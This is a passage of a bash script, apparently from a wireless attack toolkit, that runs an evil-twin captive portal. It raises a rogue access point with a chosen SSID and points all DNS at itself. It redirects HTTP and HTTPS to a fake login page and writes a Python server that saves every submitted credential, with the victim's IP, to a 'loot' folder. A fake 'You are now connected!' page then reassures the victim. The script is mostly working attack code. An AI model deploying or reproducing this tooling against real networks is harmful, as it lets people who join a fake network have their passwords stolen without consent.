    # Default index.html (WiFi portal)
    cp "$PORTAL_DIR/wifi.html" "$PORTAL_DIR/index.html" 2>/dev/null || true
    echo -e "${GREEN}[*] Portal templates created in ${PORTAL_DIR}/${NC}"
}

start_portal() {
    local ap_iface="$1"
    local inet_iface="$2"
    local essid="$3"
    local portal_type="${4:-wifi}"

    check_deps
    setup_portal_templates

    if [ -f /tmp/captive_portal.pid ]; then
        echo -e "${RED}[!] Captive portal already running. Stop it first: captive-portal stop${NC}"
        exit 1
    fi

    echo -e "${CYAN}[*] Starting captive portal: ${essid} (${portal_type})${NC}"

    # Set the portal type
    local portal_file="${PORTAL_DIR}/${portal_type}.html"
    if [ ! -f "$portal_file" ]; then
        echo -e "${YELLOW}[!] Portal type '${portal_type}' not found, using wifi${NC}"
        portal_file="${PORTAL_DIR}/wifi.html"
    fi
    cp "$portal_file" "$PORTAL_DIR/index.html"

    # Configure hostapd
    cat > "$HOSTAPD_CONF" << AP_EOF
interface=${ap_iface}
driver=nl80211
ssid=${essid}
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
AP_EOF

    # Configure dnsmasq (DHCP + DNS redirect)
    cat > "$DNSMASQ_CONF" << DNS_EOF
interface=${ap_iface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
log-queries
DNS_EOF

    # Set IP on AP interface
    ip addr flush dev "$ap_iface" 2>/dev/null || true
    ip addr add 10.0.0.1/24 dev "$ap_iface"
    ip link set dev "$ap_iface" up

    # Kill existing services on the interface
    killall hostapd 2>/dev/null || true
    killall dnsmasq 2>/dev/null || true
    killall python3 2>/dev/null || true

    # Start hostapd
    hostapd -B "$HOSTAPD_CONF"
    echo -e "${GREEN}[+] Rogue AP started: ${essid}${NC}"

    # Start dnsmasq
    dnsmasq -C "$DNSMASQ_CONF"
    echo -e "${GREEN}[+] DNS/DHCP server started${NC}"

    # Enable IP forwarding and NAT
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A POSTROUTING -o "$inet_iface" -j MASQUERADE
    iptables -A FORWARD -i "$inet_iface" -o "$ap_iface" -m state --state RELATED,ESTABLISHED -j ACCEPT
    iptables -A FORWARD -i "$ap_iface" -o "$inet_iface" -j ACCEPT

    # Redirect all HTTP/HTTPS to captive portal
    iptables -t nat -A PREROUTING -i "$ap_iface" -p tcp --dport 80 -j REDIRECT --to-port 80
    iptables -t nat -A PREROUTING -i "$ap_iface" -p tcp --dport 443 -j REDIRECT --to-port 80

    # Start credential capture server
    CAPTIVE_SERVER="$PORTAL_DIR/captive_server.py"
    cat > "$CAPTIVE_SERVER" << 'SRV_EOF'
#!/usr/bin/env python3
import http.server, json, os, time, ssl, sys, datetime
PORT = 80
LOOT = "/opt/cardputer/loot/recon"
class CaptiveHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args): pass
    def do_GET(self):
        if self.path == "/submit":
            self.send_response(302)
            self.send_header("Location", "/success.html")
            self.end_headers()
            return
        f = "/opt/cardputer/config/captive/index.html"
        try:
            with open(f) as fh:
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(fh.read().encode())
        except:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not found")
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length).decode("utf-8", errors="replace")
        creds = {}
        for pair in data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                creds[k] = v.replace("+", " ")
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = os.path.join(LOOT, f"captive_creds_{ts}.json")
        with open(fname, "w") as f:
            json.dump({"timestamp": ts, "ip": self.client_address[0], "credentials": creds}, f, indent=2)
        print(f"[+] Credentials captured from {self.client_address[0]}: {list(creds.keys())}")
        self.send_response(302)
        self.send_header("Location", "/success.html")
        self.end_headers()
try:
    s = http.server.HTTPServer(("0.0.0.0", PORT), CaptiveHandler)
    s.serve_forever()
except KeyboardInterrupt:
    pass
SRV_EOF
    chmod +x "$CAPTIVE_SERVER"
    python3 "$CAPTIVE_SERVER" &
    CAPTIVE_PID=$!
    echo "$CAPTIVE_PID" > /tmp/captive_portal.pid

    # Create success page
    cat > "$PORTAL_DIR/success.html" << 'SUCCESS_EOF'
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title><style>
body{font-family:system-ui,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{text-align:center;padding:32px;background:#fff;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
.icon{font-size:48px;margin-bottom:12px}
h2{color:#2e7d32}
</style></head><body><div class="container"><div class="icon">&#10003;</div><h2>You are now connected!</h2><p>Enjoy your internet access.</p></div></body></html>
SUCCESS_EOF

    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║     CAPTIVE PORTAL ACTIVE               ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}[*] SSID: ${essid}${NC}"
    echo -e "${CYAN}[*] Type: ${portal_type}${NC}"
    echo -e "${CYAN}[*] AP:   ${ap_iface} (10.0.0.1)${NC}"
    echo -e "${CYAN}[*] NAT:  ${inet_iface}${NC}"
    echo -e "${CYAN}[*] Credentials saved to: ${LOOT_DIR}/${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
    echo ""

    # Wait for Ctrl+C
    wait $CAPTIVE_PID 2>/dev/null || true
    stop_portal
}

stop_portal() {
    echo -e "${YELLOW}[*] Stopping captive portal...${NC}"

    # Kill services
    killall hostapd 2>/dev/null || true
    killall dnsmasq 2>/dev/null || true

    # Kill captive server
    if [ -f /tmp/captive_portal.pid ]; then
        kill "$(cat /tmp/captive_portal.pid)" 2>/dev/null || true
        rm -f /tmp/captive_portal.pid
    fi

    # Flush iptables
    iptables -t nat -F 2>/dev/null || true
    iptables -F FORWARD 2>/dev/null || true
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true

    # Cleanup
    rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF"

    echo -e "${GREEN}[*] Captive portal stopped${NC}"
}

show_status() {
    if [ -f /tmp/captive_portal.pid ] && kill -0 "$(cat /tmp/captive_portal.pid)" 2>/dev/null; then
        echo -e "${GREEN}[*] Captive portal is RUNNING${NC}"
        if [ -f "$HOSTAPD_CONF" ]; then
            echo -e "    SSID: $(grep '^ssid=' "$HOSTAPD_CONF" 2>/dev/null | cut -d= -f2)"
        fi
        echo -e "    PID:  $(cat /tmp/captive_portal.pid)"
        echo -e "    Loot: ${LOOT_DIR}/"
    else
        echo -e "${YELLOW}[*] Captive portal is NOT running${NC}"
    fi
}

show_logs() {
    echo -e "${CYAN}[*] Captured credentials:${NC}"
    if ls "${LOOT_DIR}"/captive_creds_*.json 1>/dev/null 2>&1; then
        for f in "${LOOT_DIR}"/captive_creds_*.json; do
            echo -e "${GREEN}[$(basename "$f")]${NC}"
            python3 -c "import json; d=json.load(open('$f')); print(f'  IP: {d.get(\"ip\",\"?\")} | Creds: {list(d.get(\"credentials\",{}).keys()))}')" 2>/dev/null || echo "  (parse error)"
        done
    else
        echo -e "${YELLOW}[!] No captured credentials yet${NC}"
    fi
}

list_portals() {
    echo -e "${CYAN}[*] Available portal templates:${NC}"
    if [ -d "$PORTAL_DIR" ]; then
        for f in "$PORTAL_DIR"/*.html; do
            [ -f "$f" ] && echo -e "  ${GREEN}$(basename "$f")${NC}"
        done
    else
        echo -e "${YELLOW}[!] No portal templates found. Run 'captive-portal start' to create them.${NC}"
    fi
}

# Main
mkdir -p "$LOOT_DIR"

case "${1:-}" in
    start)
        shift
        if [ -z "${1:-}" ] || [ -z "${2:-}" ] || [ -z "${3:-}" ]; then
            echo -e "${RED}[!] Usage: captive-portal start <ap_iface> <inet_iface> <essid> [type]${NC}"
            exit 1
        fi
        start_portal "$1" "$2" "$3" "${4:-wifi}"
        ;;
    stop)
        stop_portal
        ;;
    status)
        show_status
        ;;
    logs)
        show_logs
        ;;
    list)
        list_portals
        ;;
    create)
        shift
        setup_portal_templates
        echo -e "${GREEN}[*] Templates created in ${PORTAL_DIR}/${NC}"
        ;;
    *)
        usage
        ;;
esac